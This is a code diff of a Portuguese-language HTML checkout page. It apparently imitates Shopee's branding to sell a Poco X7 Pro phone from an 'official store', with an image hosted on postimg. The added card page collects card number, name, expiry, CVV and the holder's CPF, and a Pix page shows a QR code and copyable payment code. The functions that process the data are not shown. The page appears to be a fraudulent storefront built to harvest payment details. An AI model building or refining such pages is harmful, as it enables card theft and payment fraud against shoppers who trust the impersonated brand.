@@ -282,11 +282,107 @@
                 </button>
             </div> 
              
-            <div id="step-2" style="display:none; padding: 15px;">
-                <p style="font-weight: bold;">Dados para entrega:</p>
-                <input type="text" id="nome" class="input-box" placeholder="Nome Completo">
-                <input type="tel" id="cep" class="input-box" placeholder="CEP" maxlength="8">
-                <button class="btn-buy-now" style="width:100%; height:45px; border-radius:2px; background-color: var(--shopee); margin-top: 15px;" onclick="gerarPix()">FINALIZAR COMPRA</button>
+            <div id="step-2" style="display:none; margin: -15px; height: 85vh; overflow-y: auto;">
+    
+    <div id="checkoutPage" class="page active">
+        <div class="header" onclick="backToStep1()"><i class="fas fa-arrow-left"></i> <h1>Finalizar Compra</h1></div>
+
+        <div class="section" onclick="openPage('addrPage')">
+            <div class="addr-box">
+                <i class="fas fa-map-marker-alt" style="color:var(--shopee)"></i>
+                <div class="addr-info">
+                    <b id="dispName">Toque para definir nome e telefone</b>
+                    <p id="dispAddr">Toque para configurar endereço de entrega</p>
+                </div>
+                <i class="fas fa-chevron-right" style="margin-left:auto; color:#ccc; align-self:center;"></i>
+            </div>
+        </div>
+
+        <div class="section">
+            <p style="font-size:12px; color:#222; display: flex; align-items: center;">
+                <span class="store-tag">Indicado</span> 
+                <b style="margin-left: 5px;">Loja Onix Oficial</b>
+                <i class="fas fa-check-circle verified-badge"></i>
+            </p>
+            <div class="prod-card">
+                <img src="https://i.postimg.cc/hvd5NVng/celular-xiaomi-poco-x7-pro-nfc-dual-sim-512gb-12gb-ram.jpg" class="prod-img">
+                <div style="flex:1">
+                    <h2 style="font-size:13px; font-weight:400; line-height: 1.4;">Smartphone Poco X7 Pro Ultra 5G - Versão Global Ofical</h2>
+                    <div style="margin-top:5px;">
+                        <span id="resumoOpcoes" style="font-size:11px; color:#666;"></span>
+                    </div>
+                    <div style="margin-top:8px;"><span id="checkoutPriceText" class="orange-text" style="font-size: 16px; font-weight: 500;">R$0,00</span></div>
+                </div>
+            </div>
+        </div>
+
+        <div class="section">
+            <p style="font-size:14px; font-weight:bold; margin-bottom:10px;">Método de Pagamento</p>
+            <div class="pay-method" id="payPix" onclick="togglePix()">
+                <div class="pay-left">
+                    <i class="fas fa-coins" style="color:var(--teal)"></i> 
+                    <div>Pix <br><small style="color:#888; font-size:10px;">Pagamento instantâneo</small></div>
+                </div>
+                <div class="radio-circle"></div>
+            </div>
+            <div class="pay-method" onclick="openPage('cardPage')">
+                <div class="pay-left">
+                    <i class="fas fa-credit-card" style="color:var(--blue)"></i> 
+                    <div>Cartão de Crédito <br><small style="color:#888; font-size:10px;">Parcelamento em até 12x</small></div>
+                </div>
+                <span class="orange-text" style="font-size:12px; font-weight:bold;">ADICIONAR</span>
+            </div>
+        </div>
+
+        <div class="section">
+            <div class="price-row"><span>Subtotal</span><span id="subTotalProd">R$0,00</span></div>
+            <div class="price-row"><span>Frete</span><span style="color:var(--teal)">Grátis</span></div>
+            <div class="price-row orange-text" id="pixDiscountRow" style="display:none;"><span>Desconto Pix</span><span>-R$10,00</span></div>
+            <div class="price-row" style="margin-top:10px; font-weight:bold; font-size:16px;">
+                <span>Total</span><span id="finalPrice" class="orange-text">R$0,00</span>
+            </div>
+        </div>
+
+        <div class="footer">
+            <div class="total-info">
+                <p style="font-size:11px; color:#666;">Total</p>
+                <b id="footerPrice" class="orange-text" style="font-size:17px;">R$0,00</b>
+            </div>
+            <button class="btn-shopee" onclick="finalizarPedido()">FAZER PEDIDO</button>
+        </div>
+    </div>
+
+    <div id="addrPage" class="page">
+        <div class="header" onclick="openPage('checkoutPage')"><i class="fas fa-arrow-left"></i> <h1>Endereço</h1></div>
+        <div class="section">
+            <input type="text" id="inName" placeholder="Nome Completo">
+            <input type="tel" id="inCep" placeholder="CEP" maxlength="8" onblur="buscarCep()">
+            <input type="text" id="inRua" placeholder="Rua / Logradouro">
+            <div style="display:flex; gap:10px;"><input type="text" id="inNum" placeholder="Nº" style="flex:0.4;"><input type="text" id="inBairro" placeholder="Bairro" style="flex:1.6;"></div>
+            <button class="btn-shopee" style="width:100%; border-radius:4px; height:45px;" onclick="salvarEndereco()">SALVAR</button>
+        </div>
+    </div>
+
+    <div id="cardPage" class="page">
+        <div class="header" onclick="openPage('checkoutPage')"><i class="fas fa-arrow-left"></i> <h1>Cartão</h1></div>
+        <div class="section">
+            <input type="tel" id="cardNumber" placeholder="Número do Cartão">
+            <input type="text" id="cardName" placeholder="Nome no Cartão">
+            <div style="display:flex; gap:10px;"><input type="tel" id="cardExp" placeholder="MM/AA"><input type="tel" id="cardCvv" placeholder="CVV"></div>
+            <input type="tel" id="cardCpf" placeholder="CPF do Titular">
+            <select id="cardInstallments"></select>
+            <button class="btn-shopee" style="width:100%; border-radius:4px; height:45px;" onclick="processarCartao()">CONFIRMAR</button>
+        </div>
+    </div>
+
+    <div id="pixPage" class="page">
+        <div class="header" onclick="openPage('checkoutPage')"><i class="fas fa-arrow-left"></i> <h1>Pagamento Pix</h1></div>
+        <div class="section" style="text-align:center;">
+            <img id="qrCodeFinal" src="" width="180">
+            <div id="pixCodeDisplay" style="background:#f0f0f0; padding:10px; font-size:10px; word-break:break-all; border:1px dashed #ccc; margin:15px 0;"></div>
+            <button class="btn-shopee" style="width:100%; border-radius:4px; height:45px;" onclick="copyPix()">COPIAR CÓDIGO</button>
+        </div>
+    </div>
             </div>
 
             <div id="step-pix" style="display:none; text-align:center; padding: 15px;">
@@ -392,4 +488,5 @@
     </script>
 </body>
 </html>
+
 
